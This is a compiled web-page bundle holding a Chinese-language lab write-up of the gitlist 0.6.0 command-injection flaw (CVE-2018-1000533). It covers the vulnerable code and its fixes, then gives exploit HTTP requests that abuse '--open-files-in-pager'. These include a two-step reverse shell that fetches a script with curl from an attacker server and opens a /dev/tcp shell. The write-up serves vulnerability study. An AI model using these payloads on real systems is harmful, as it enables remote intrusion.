import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r,o as l,c as d,a as i,b as e,d as a,e as t}from"./app-58e4a7d6.js";const c={},o=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>gitlist是一款使用PHP开发的图形化git仓库查看工具。在其0.6.0版本及以前，存在一处命令参数注入问题，可以导致远程命令执行漏洞。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>将看到一个名为<code>example</code>的仓库。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,7),p={href:"https://github.com/vulhub/vulhub/tree/master/gitlist/CVE-2018-1000533",target:"_blank",rel:"noopener noreferrer"},u=t(`<p>在用户对仓库中代码进行搜索的时候，gitlist将调用<code>git grep</code>命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }

    $query = escapeshellarg($query);

    try {
        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number {$query} $branch&quot;);
    } catch (\\RuntimeException $e) {
        return false;
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中，<code>$query</code>是搜索的关键字，<code>$branch</code>是搜索的分支。</p><p>如果用户输入的<code>$query</code>的值是<code>--open-files-in-pager=id;</code>，将可以执行<code>id</code>命令：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202232144734.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>导致这个漏洞的原因，有几点：</p><ol><li>开发者对于<code>escapeshellarg</code>函数的误解，造成参数注入</li><li><code>git grep</code>的参数<code>--open-files-in-pager</code>的值，将被直接执行</li></ol><p>理论上，在经过<code>$query = escapeshellarg($query);</code>处理后，<code>$query</code>将变成一个由单引号包裹的字符串。但不出漏洞的前提是，这个字符串应该出现在“参数值”的位置，而不是出现在参数选项（option）中。</p><p>我们可以试一下如下命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202232144303.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>如上图，我将<code>$query</code>放在了<code>-e</code>参数的值的位置，此时它就仅仅是一个字符串而已，并不会被当成参数<code>--open-files-in-pager</code>。</p><p>这应该作为本漏洞的最佳修复方法，也是git官方对pattern可能是用户输入的情况的一种解决方案（以下说明来自man-page）：</p><blockquote><p>-e The next parameter is the pattern. This option has to be used for patterns starting with - and should be used in scripts passing user input to grep. Multiple patterns are combined by or.</p></blockquote><p>当然，gitlist的开发者用了另一种修复方案：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }
    $query = preg_replace(&#39;/(--?[A-Za-z0-9\\-]+)/&#39;, &#39;&#39;, $query);
    $query = escapeshellarg($query);
    try {
        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number -- {$query} $branch&quot;);
    } catch (\\RuntimeException $e) {
        return false;
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>首先用<code>preg_replace</code>将<code>-</code>开头的非法字符移除，然后将<code>$query</code>放在<code>--</code>的后面。在命令行解析器中，<code>--</code>的意思是，此后的部分不会再包含参数选项（option）：</p><blockquote><p>A -- signals the end of options and disables further option processing. Any arguments after the -- are treated as filenames and arguments. An argument of - is equivalent to --.</p><p>If arguments remain after option processing, and neither the -c nor the -s option has been supplied, the first argument is assumed to be the name of a file containing shell commands. If bash is invoked in this fashion, $0 is set to the name of the file, and the positional parameters are set to the remaining arguments. Bash reads and executes commands from this file, then exits. Bash&#39;s exit status is the exit status of the last command executed in the script. If no commands are executed, the exit status is 0. An attempt is first made to open the file in the current directory, and, if no file is found, then the shell searches the directories in PATH for the script.</p></blockquote><p>举个简单的例子，如果我们需要查看一个文件名是<code>--name</code>的文件，我们就不能用<code>cat --name</code>来读取，也不能用<code>cat &#39;--name&#39;</code>，而必须要用<code>cat -- --name</code>。从这个例子也能看出，单引号并不是区分一个字符串是“参数值”或“选项”的标准。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202232145144.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>所以官方这个修复方案也是可以接受的，只不过第一步的<code>preg_replace</code>有点影响正常搜索功能。</p><h2 id="漏洞复现-1" tabindex="-1"><a class="header-anchor" href="#漏洞复现-1" aria-hidden="true">#</a> 漏洞复现</h2><p>发送如下数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /example/tree/a/search HTTP/1.1
Host: your-ip:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Length: 56

query=--open-files-in-pager=touch /tmp/success;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中，我们访问的是<code>/example/tree/a/search</code>，example是项目名称，需要是目标gitlist上一个已存在的项目；a在正常情况下应该是分支的名称，也就是<code>&quot;grep -i --line-number {$query} $branch&quot;</code>中的<code>$branch</code>，但因为我们的<code>$query</code>被当成了一个参数，所以<code>$branch</code>就应该被当做搜索的关键字。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202232139250.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>如果没有搜索结果的话，我们的命令是不会被执行的，所以我用了“a”这个关键字，只是为了保证能搜出结果，你也可以换成其他的试试。</p><p>数据包发送后，用<code>docker-compose exec web bash</code>进入容器中，可见<code>/tmp/success</code>已成功创建：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202232138346.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>反弹shell可以分为两步，共发送两个数据包：</p>`,30),m={href:"http://shell.sh",target:"_blank",rel:"noopener noreferrer"},h={href:"http://shell.sh",target:"_blank",rel:"noopener noreferrer"},v=t(`<p>在 vps 上新建 test.txt 文件并启动 http 服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># cat test.txt 
bash -i &gt;&amp; /dev/tcp/your-ip/9999 0&gt;&amp;1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># python3 -m http.server 8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>发送第一个数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /example/tree/a/search HTTP/1.1
Host: your-ip:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Length: 56

query=--open-files-in-pager=curl http://your-ip:8888/test.txt -o /tmp/test.sh;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发送第二个数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /example/tree/a/search HTTP/1.1
Host: your-ip:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Length: 56

query=--open-files-in-pager=/bin/bash /tmp/test.sh;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230725162429368.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,9);function g(b,x){const n=r("ExternalLinkIcon");return l(),d("div",null,[o,i("p",null,[e("参考链接："),i("a",p,[e("Vulhub"),a(n)])]),u,i("ul",null,[i("li",null,[e("第一个数据包，使用 curl 先将 shell.txt 下载到 /tmp 目录下，改名为 "),i("a",m,[e("shell.sh"),a(n)]),e("；")]),i("li",null,[e("第二个数据包，执行 "),i("a",h,[e("shell.sh"),a(n)]),e("。")])]),v])}const _=s(c,[["render",g],["__file","Gitlist 0.6.0 远程命令执行漏洞 CVE-2018-1000533.html.vue"]]);export{_ as default};
